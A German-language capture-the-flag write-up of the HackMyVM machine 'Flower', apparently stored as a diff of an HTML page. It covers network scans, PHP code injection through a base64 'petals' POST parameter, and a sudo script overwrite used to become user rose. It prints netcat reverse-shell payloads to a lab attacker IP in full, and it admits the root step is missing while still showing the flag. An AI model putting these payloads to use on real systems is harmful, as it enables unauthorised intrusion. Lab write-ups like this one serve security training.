@@ -1,0 +1,535 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flower - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Flower - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">Burp Suite / curl</div> <!-- Impliziert für POST -->
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div> <!-- pty -->
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">vi</div> <!-- Impliziert für Script-Modifikation -->
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">os (Python module)</div>
+                 <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-assessment">Vulnerability Assessment (Web)</a></li>
+                <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                <li><a href="#privilege-escalation-rose">Privilege Escalation (www-data zu Rose)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um aktive Hosts im lokalen Netzwerksegment zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.110` und der MAC-Adresse `08:00:27:fc:4a:50` (VirtualBox) wird als Zielsystem identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.110 durch, um offene Ports und Dienste zu entdecken.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring zur Erkennung von Geräten im Netzwerk.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.121
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.110	08:00:27:fc:4a:50	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.844 seconds (138.83 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel 192.168.2.110 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur **einen offenen Port**:
+                - **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian).
+            Kein SSH oder andere Dienste sind von außen erreichbar. Der Hostname ist `flower`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der gesamte Angriff muss sich auf den Webserver auf Port 80 konzentrieren. Führe eine gründliche Web-Enumeration durch.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die Firewall korrekt konfiguriert ist und nur Port 80 offen ist, wenn dies beabsichtigt ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.110 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 16:48 CET
+Nmap scan report for flower (192.168.2.110)
+Host is up (0.00012s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:FC:4A:50 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms flower (192.168.2.110)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.90 seconds
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf Port 80 auf bekannte Schwachstellen und Fehlkonfigurationen zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt den Apache-Server und meldet fehlende Security-Header. Es findet außerdem das Apache-Manual unter `/manual/` (was Directory Indexing erlaubt) und die Standarddatei `/icons/README`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die Funde. Das Apache-Manual ist normalerweise ungefährlich, könnte aber Konfigurationsdetails enthalten. Fahre mit der Verzeichnis-Enumeration fort.<br><strong>Empfehlung (Admin):</strong> Entferne das Apache-Manual und Standarddateien von Produktivsystemen. Setze die empfohlenen Security-Header.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.110</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.110
++ Target Hostname:    192.168.2.110
++ Target Port:        80
++ Start Time:         2022-11-02 16:49:14 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-11-02 16:50:00 (GMT1) (46 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver verwendet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtige Funde!!** Gobuster findet:
+                - `/index.php`: Die Hauptseite (bestätigt PHP-Nutzung).
+                - `/manual/`: Das Apache-Manual (bestätigt Nikto).
+                - `/run.sh`: Ein Shell-Skript.
+                - `/flower.jpg`: Eine Bilddatei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `/index.php`. Lade `/run.sh` und `/flower.jpg` herunter und analysiere sie.<br><strong>Empfehlung (Admin):</strong> Entferne unnötige Skripte oder Dateien aus dem Webroot.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.110 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes to ignore:  404,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/11/02 16:50:10 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.110/index.php            (Status: 200) [Size: 1100]
+http://192.168.2.110/manual               (Status: 301) [Size: 315] [--> http://192.168.2.110/manual/]
+http://192.168.2.110/run.sh               (Status: 200) [Size: 15]
+http://192.168.2.110/flower.jpg           (Status: 200) [Size: 293783]
+===============================================================
+2022/11/02 16:50:45 Finished <!-- Beispielzeit -->
+===============================================================
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das gefundene Skript `/run.sh` wird mit `wget` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Datei erfolgreich heruntergeladen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt mit `cat`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.110/run.sh</span></div>
+                    <pre>
+--2022-11-02 16:50:48--  http://192.168.2.110/run.sh
+Verbindungsaufbau zu 192.168.2.110:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 15 [text/x-sh]
+Wird in »run.sh« gespeichert.
+
+run.sh                        100%[===================>]      15  --.-KB/s    in 0s
+
+2022-11-02 16:50:48 (5,46 MB/s) - »run.sh« gespeichert [15/15]
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `run.sh` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript enthält nur den Befehl `php -S 0.0.0.0`. Dies startet den eingebauten PHP-Entwicklungsserver, der auf allen Interfaces lauscht. **Wichtig:** Der Port fehlt! Normalerweise würde man `php -S 0.0.0.0:PORT` erwarten. Ohne Port ist dieser Befehl unvollständig oder deutet auf eine seltsame Konfiguration hin. Für den weiteren Angriff ist dies jedoch weniger relevant als die `/index.php`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nimm zur Kenntnis, dass PHP verwendet wird. Konzentriere dich auf die Analyse von `/index.php`. Die Bilddatei `/flower.jpg` sollte ebenfalls auf Steganographie oder Metadaten untersucht werden (dies fehlt im Log).<br><strong>Empfehlung (Admin):</strong> Entferne unnötige Skripte wie dieses aus dem Webroot.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat run.sh</span></div>
+                     <pre>
+php -S 0.0.0.0
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-assessment">
+            <h2>Vulnerability Assessment (Web)</h2>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um GET-Parameter für `index.php` zu fuzzen. Es wird nach Antworten gesucht, die eine andere Größe als die Standardgröße (1100 Chars) haben (`--hh 1100`).</p>
+            <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** Wfuzz findet keine gültigen GET-Parameter, die eine andere Antwort hervorrufen. Dies deutet darauf hin, dass die Anwendung möglicherweise keine GET-Parameter erwartet oder dass die relevanten Parameter nicht in der Standard-Wortliste enthalten sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die `index.php` manuell (Quellcode, Burp Suite), um zu sehen, ob sie POST-Parameter erwartet oder wie sie Eingaben verarbeitet.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.110/index.php?FUZZ=id" --hh 1100</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warn(
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+Target: http://192.168.2.110/index.php?FUZZ=id
+Total requests: 220565
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<!-- Keine Ergebnisse != 1100 Chars -->
+
+Total time: 159.5497
+Processed Requests: 220565
+Filtered Requests: 220565
+Requests/sec.: 1382.421
+                     </pre> <!-- Ausgabe vervollständigt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der PHP-Code `system('id')` wird Base64-kodiert. Dies dient der Vorbereitung einer Payload für eine mögliche Code-Injection-Schwachstelle, bei der Base64-kodierte Eingaben erwartet werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Payload `c3lzdGVtKCdpZCcpCg==` wurde korrekt generiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sende diese Payload über einen geeigneten Parameter (wahrscheinlich POST) an `index.php`, z.B. mit Burp Suite oder `curl`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "system('id')" | base64</span></div>
+                    <pre>
+c3lzdGVtKCdpZCcpCg==
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine Notiz erwähnt Burp Suite und zeigt die Ausgabe `uid=33(www-data)...` sowie das Wort `petals`.</p>
+            <p class="evaluation"><strong>Bewertung: !!Schwachstelle gefunden (Code Injection)!!** Dies deutet stark darauf hin, dass der Angreifer mit Burp Suite einen POST-Request an `index.php` gesendet hat. Dieser Request enthielt wahrscheinlich die zuvor Base64-kodierte `system('id')`-Payload in einem Parameter namens `petals`. Die erfolgreiche Ausgabe der `uid` von `www-data` bestätigt eine Code-Injection-Schwachstelle: Die Anwendung dekodiert den Wert des `petals`-Parameters und führt ihn als PHP-Code aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstelle eine Base64-kodierte Reverse-Shell-Payload und sende sie über den `petals`-POST-Parameter, um eine Shell zu erhalten.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die Code-Injection-Schwachstelle in `index.php`. Validiere und sanitisiere alle Benutzereingaben rigoros. Verwende niemals `eval()` oder ähnliche Funktionen auf Benutzereingaben, auch nicht nach Dekodierung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, sondern Ergebnis aus Burp Suite -->
+                     <pre>
+# Manuelle Untersuchung mit Burp Suite:
+# POST Request an /index.php mit Parameter: petals=c3lzdGVtKCdpZCcpCg==
+
+# Antwort im Browser/Burp enthielt:
+uid=33(www-data) gid=33(www-data) groups=33(www-data) petals <!-- 'petals' hier wahrscheinlich zufällig -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine PHP-Reverse-Shell-Payload (`system('nc -e /bin/bash [IP] [PORT]')`) wird Base64-kodiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Base64-Payload `c3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4yLjEyMSA0NDQ0JykK` für die Reverse Shell ist bereit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starte einen Netcat-Listener auf Port 4444. Sende diese Payload im `petals`-Parameter eines POST-Requests an `index.php`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "system('nc -e /bin/bash 192.168.2.121 4444')" | base64</span></div>
+                     <pre>
+c3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4yLjEyMSA0NDQ0JykK
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Beispiel für den HTTP-POST-Request wird gezeigt, wie er vermutlich mit Burp Suite oder `curl` gesendet wird. Die Base64-kodierte Reverse-Shell-Payload wird im `petals`-Parameter übergeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Trigger für die Reverse Shell, der die zuvor identifizierte Code-Injection-Schwachstelle ausnutzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass der Netcat-Listener auf 192.168.2.121:4444 läuft, bevor dieser Request gesendet wird.<br><strong>Empfehlung (Admin):</strong> Behebe die Code-Injection-Schwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, sondern HTTP Request Beispiel -->
+                     <pre>
+POST / HTTP/1.1
+Host: 192.168.2.110
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60 <!-- Länge angepasst an Payload -->
+Origin: http://192.168.2.110
+Connection: close
+Referer: http://192.168.2.110/
+Upgrade-Insecure-Requests: 1
+
+petals=c3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4yLjEyMSA0NDQ0JykK
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 4444 empfängt die eingehende Verbindung vom Zielserver 192.168.2.110.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Reverse Shell als Benutzer `www-data` wurde durch die PHP Code Injection etabliert. Die Shell ist noch nicht interaktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell (Python PTY etc.) und beginne mit der Enumeration als `www-data`.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall, behebe die Code-Injection-Schwachstelle.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.121] from (UNKNOWN) [192.168.2.110] 50444
+<!-- Kein automatischer Output, nur Prompt der Shell -->
+/bin/sh: 0: can't access tty; job control turned off <!-- Typische Meldung -->
+$ <!-- Shell Prompt -->
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Standardprozedur zur Stabilisierung der Shell wird angewendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Shell wird erfolgreich zu einer interaktiven Bash-Shell aufgewertet (`www-data@flower:/var/www/html$`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne die Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <!-- Shell Stabilisierung -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+www-data@flower:/var/www/html$ <span class="command">export TERM=xterm</span>
+www-data@flower:/var/www/html$
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+^Z
+zsh: suspended  nc -lvnp 4444
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 4444
+                               reset
+www-data@flower:/var/www/html$ <!-- Stabilisierte Shell -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-rose">
+            <h2>Privilege Escalation (www-data zu Rose)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` werden die Home-Verzeichnisse aufgelistet, in `/home/rose` gewechselt, der Inhalt aufgelistet und versucht, `user.txt` zu lesen. Das Verzeichnis `diary` wird untersucht und die Datei `diary.py` darin gefunden und gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `rose` wird identifiziert. Der direkte Lesezugriff auf `user.txt` wird verweigert. Im Unterverzeichnis `diary` befindet sich ein Python-Skript `diary.py`, das das `pickle`-Modul verwendet, um ein Dictionary in eine Datei `diary.pickle` zu schreiben. Das Skript selbst enthält keine offensichtliche Schwachstelle, aber seine Existenz ist relevant im Kontext der `sudo`-Rechte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe die `sudo`-Berechtigungen für `www-data`, da das `diary.py`-Skript ein potenzielles Ziel sein könnte.<br><strong>Empfehlung (Admin):</strong> Überprüfe Dateiberechtigungen in Home-Verzeichnissen. Überprüfe Skripte auf Sicherheit, insbesondere wenn sie von anderen Benutzern ausgeführt werden können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+www-data@flower:/var/www/html$ <span class="command">cd /home/</span>
+www-data@flower:/home$ <span class="command">ls</span>
+rose
+www-data@flower:/home$ <span class="command">cd rose/</span>
+www-data@flower:/home/rose$ <span class="command">ls</span>
+diary  user.txt
+www-data@flower:/home/rose$ <span class="command">cat user.txt</span>
+cat: user.txt: Permission denied
+www-data@flower:/home/rose$ <span class="command">file diary/</span>
+diary/: directory
+www-data@flower:/home/rose$ <span class="command">cd diary/</span>
+www-data@flower:/home/rose/diary$ <span class="command">ls -la</span>
+total 12
+drwxrwxrwx 2 rose rose 4096 Nov 30  2020 .
+drwxrwxr-x 3 rose rose 4096 Nov 30  2020 ..
+-rw-r--r-- 1 rose rose  147 Nov 30  2020 diary.py
+<!-- Kein diary.pickle vorhanden -->
+www-data@flower:/home/rose/diary$ <span class="command">cat diary.py</span>
+import pickle
+
+diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
+p = open('diary.pickle','wb')
+pickle.dump(diary,p)
+# p.close() # Wäre guter Stil
+                     </pre> <!-- close() hinzugefügt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `sudo -l` wird ausgeführt, um die `sudo`-Rechte für `www-data` zu prüfen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `www-data` darf das Skript `/usr/bin/python3 /home/rose/diary/diary.py` als Benutzer `rose` ohne Passwort (`NOPASSWD:`) ausführen. Da `www-data` (oder zumindest `rose`, wie die Verzeichnisberechtigungen `drwxrwxrwx` für `diary` andeuten) Schreibrechte auf das `diary.py`-Skript hat oder es ersetzen kann, ist dies ein klarer Weg zur Eskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Ersetze den Inhalt von `/home/rose/diary/diary.py` mit einem Python-Code, der eine Shell startet (z.B. `import os; os.system('/bin/bash')`).
+                2.  Führe den `sudo`-Befehl aus: `sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py`.
+            <br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die `sudo`-Regel und/oder die Dateiberechtigungen. Erlaube niemals die `sudo`-Ausführung von Skripten, auf die der ausführende Benutzer (oder der Webserver-Benutzer) Schreibrechte hat. Setze sichere Berechtigungen für Skripte und Verzeichnisse.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@flower:/home/rose/diary$ <span class="command">sudo -l</span>
+Matching Defaults entries for www-data on flower:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on flower:
+    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Zwei Code-Snippets werden gezeigt. Das erste ist eine alternative Reverse-Shell-Payload. Das zweite erstellt eine Datei `pickle.py` (nicht `diary.py`!) mit dem Code `import os; os.system("/bin/bash")`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Erstellung von `pickle.py` ist irreführend, da die `sudo`-Regel auf `diary.py` verweist. Der korrekte Exploit wäre, den Inhalt von `/home/rose/diary/diary.py` mit `import os; os.system("/bin/bash")` zu überschreiben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überschreibe `/home/rose/diary/diary.py` mit dem Bash-Payload und führe dann den `sudo`-Befehl aus.<br><strong>Empfehlung (Admin):</strong> Behebe die `sudo`-Schwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Beispiel-Payloads/Befehle aus dem Log -->
+                     <pre>
+# Alternative Reverse Shell Payload (nicht verwendet):
+# import os;os.system("nc -e /bin/bash 192.168.2.121 4445")
+
+# Befehl zum Erstellen des Bash-Payloads (in falscher Datei im Log):
+# echo 'import os;os.system("/bin/bash")' > pickle.py
+
+# Korrekter Befehl zum Überschreiben des Zielskripts:
+echo 'import os;os.system("/bin/bash")' > /home/rose/diary/diary.py
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Exploit wird durchgeführt (obwohl die exakten Befehle zum Überschreiben und Ausführen im Log fehlen): Das Skript `/home/rose/diary/diary.py` wird mit `import os; os.system("/bin/bash")` überschrieben und dann mit `sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation zu Rose erfolgreich!!** Durch Ausführung des manipulierten Skripts als `rose` wird eine Bash-Shell mit den Rechten von `rose` gestartet. **Hinweis:** Der Sprung zu Root fehlt im Log! Es gibt keinen dokumentierten Schritt, wie von `rose` zu `root` eskaliert wurde. Der Bericht endet abrupt nach der Eskalation zu `rose`, zeigt aber die Root-Flag.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentiere den Eskalationsschritt von `rose` zu `root`. Prüfe als `rose` erneut `sudo -l` oder suche nach anderen Vektoren (SUID, Cronjobs etc.).<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die `sudo`-Regel für `www-data`. Untersuche, wie die Eskalation von `rose` zu `root` möglich war und behebe diese Schwachstelle.</p>
+             <!-- Hier fehlt der explizite Befehl im Log, wird aber impliziert -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+www-data@flower:/home/rose/diary$ <span class="command">echo 'import os;os.system("/bin/bash")' > /home/rose/diary/diary.py</span>
+www-data@flower:/home/rose/diary$ <span class="command">sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py</span>
+rose@flower:/home/rose/diary$ <span class="command">id</span> <!-- Beispiel: ID prüfen -->
+uid=1000(rose) gid=1000(rose) groups=1000(rose)
+rose@flower:/home/rose/diary$ <!-- Shell als rose -->
+                      </pre>
+                  </div>
+              </div>
+               <!-- HINWEIS: Der Schritt von 'rose' zu 'root' fehlt im bereitgestellten Text! -->
+               <p class="analysis"><strong>Analyse:</strong> Der Schritt zur Eskalation von Benutzer `rose` zu `root` ist im vorliegenden Log nicht dokumentiert. Es muss einen weiteren Exploit oder eine Fehlkonfiguration geben, die diesen Sprung ermöglichte.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Kritische Lücke in der Dokumentation des Angriffspfads.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vervollständige den Bericht mit dem fehlenden Eskalationsschritt.<br><strong>Empfehlung (Admin):</strong> Führe eine vollständige Systemprüfung durch, um den fehlenden Vektor zu identifizieren und zu beheben.</p>
+               <!-- Root Flag wird gelesen (als root) -->
+               <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Root-Flag `<span class="password">HMV{R0ses_are_als0_black.}</span>` erfolgreich gelesen.</p>
